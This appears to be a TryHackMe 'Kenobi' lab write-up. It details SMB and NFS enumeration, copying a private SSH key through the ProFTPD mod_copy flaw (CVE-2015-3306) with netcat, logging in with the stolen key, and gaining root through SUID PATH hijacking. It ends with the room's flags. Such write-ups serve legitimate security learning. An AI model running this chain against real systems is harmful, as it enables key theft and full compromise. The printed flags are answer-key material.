# TryHackMe — Kenobi Room Writeup
> **Date:** March 2026  
> **Difficulty:** Easy  
> **OS:** Ubuntu Linux  
> **Category:** Enumeration, FTP Exploitation, Privilege Escalation  

---

## Summary

This room covers enumeration of SMB shares, exploitation of a vulnerable **ProFTPD 1.3.5** server using the mod_copy vulnerability, mounting an NFS share to retrieve an SSH private key, and privilege escalation via PATH variable manipulation.

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [SMB Enumeration](#2-smb-enumeration)
3. [NFS Enumeration](#3-nfs-enumeration)
4. [FTP Exploitation — ProFTPD mod_copy](#4-ftp-exploitation--proftpd-modcopy)
5. [Mounting NFS and Retrieving SSH Key](#5-mounting-nfs-and-retrieving-ssh-key)
6. [SSH Access](#6-ssh-access)
7. [Privilege Escalation — PATH Manipulation](#7-privilege-escalation--path-manipulation)
8. [Flags](#8-flags)

---

## 1. Reconnaissance

```bash
sudo nmap -sV 10.130.175.189
```

### Results

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21 | open | ftp | ProFTPD 1.3.5 |
| 22 | open | ssh | OpenSSH 8.2p1 Ubuntu |
| 80 | open | http | Apache 2.4.41 |
| 111 | open | rpcbind | 2-4 (RPC #100000) |
| 139 | open | netbios-ssn | Samba smbd 4.6.2 |
| 445 | open | netbios-ssn | Samba smbd 4.6.2 |
| 2049 | open | nfs_acl | 3 (RPC #100227) |

### Key Findings
- **OS:** Ubuntu Linux
- **Hostname:** kenobi
- **FTP:** ProFTPD 1.3.5 — known vulnerable to CVE-2015-3306
- **SMB:** Samba running with anonymous access
- **NFS:** /var directory exposed

---

## 2. SMB Enumeration

### List available shares
```bash
smbclient -L //10.130.175.189 -N
```

### Results — 3 shares found

| Share | Type | Comment |
|-------|------|---------|
| print$ | Disk | Printer Drivers |
| **anonymous** | Disk | ← Accessible |
| IPC$ | IPC | IPC Service |

### Connect to anonymous share and download log.txt
```bash
smbclient //10.130.175.189/anonymous -N -c "get log.txt"
cat log.txt
```

> **Key info from log.txt:** FTP service running as kenobi user, SSH key generated at `/home/kenobi/.ssh/id_rsa`

---

## 3. NFS Enumeration

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.130.175.189
```

### Result
```
| nfs-showmount:
|_  /var *
```

The `/var` directory is exposed via NFS — accessible to anyone.

---

## 4. FTP Exploitation — ProFTPD mod_copy

ProFTPD 1.3.5 is vulnerable to **CVE-2015-3306** — the mod_copy module allows unauthenticated file copying anywhere on the filesystem.

### Connect via netcat and copy the SSH key
```bash
nc 10.130.175.189 21
```

```
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name

SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Kenobi's private SSH key has been copied to `/var/tmp/id_rsa`.

---

## 5. Mounting NFS and Retrieving SSH Key

```bash
# Create mount point
sudo mkdir /mnt/kenobiNFS

# Mount the /var directory from target
sudo mount 10.130.175.189:/var /mnt/kenobiNFS

# Verify the key is there
ls -la /mnt/kenobiNFS/tmp
```

```
-rw-r--r--. 1 mehdi mehdi 1675 Mar 19 22:34 id_rsa
```

### Copy and secure the key
```bash
cp /mnt/kenobiNFS/tmp/id_rsa ~/id_rsa
chmod 600 ~/id_rsa
```

---

## 6. SSH Access

```bash
ssh -i ~/id_rsa kenobi@10.130.175.189
```

```
Welcome to Ubuntu 20.04.6 LTS
kenobi@kenobi:~$
```

Successfully logged in as **kenobi**.

---

## 7. Privilege Escalation — PATH Manipulation

### Discovery
The `/usr/bin/menu` binary runs as root (SUID) and calls system commands like `curl`, `uname`, and `ifconfig` **without specifying full paths.**

### Exploit
We create a fake `curl` binary that spawns a shell, then manipulate the PATH so the system finds our fake `curl` first:

```bash
# Create fake curl that spawns a shell
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary
/usr/bin/menu
```

Select option **1 (status check)** which calls `curl` — our fake version runs instead, spawning a root shell.

```
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi)
```

**Root access achieved!**

---

## 8. Flags

### User Flag
```bash
cat /home/kenobi/user.txt
```
```
d0b0f3f53b6caa532a83915e19224899
```

### Root Flag
```bash
cat /root/root.txt
```
```
177b3cd8562289f37382721c28381f02
```

---

## What I Learned

- How to enumerate SMB shares with `smbclient`
- How to enumerate NFS mounts with nmap scripts
- How ProFTPD mod_copy (CVE-2015-3306) works
- How to mount remote NFS shares locally
- How PATH variable manipulation works for privilege escalation
- How SUID binaries can be abused when they call commands without full paths

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Reconnaissance and enumeration |
| smbclient | SMB share enumeration |
| netcat | FTP exploitation via mod_copy |
| NFS mount | Retrieving files from remote share |
| SSH | Remote access via stolen private key |
| PATH manipulation | Privilege escalation |
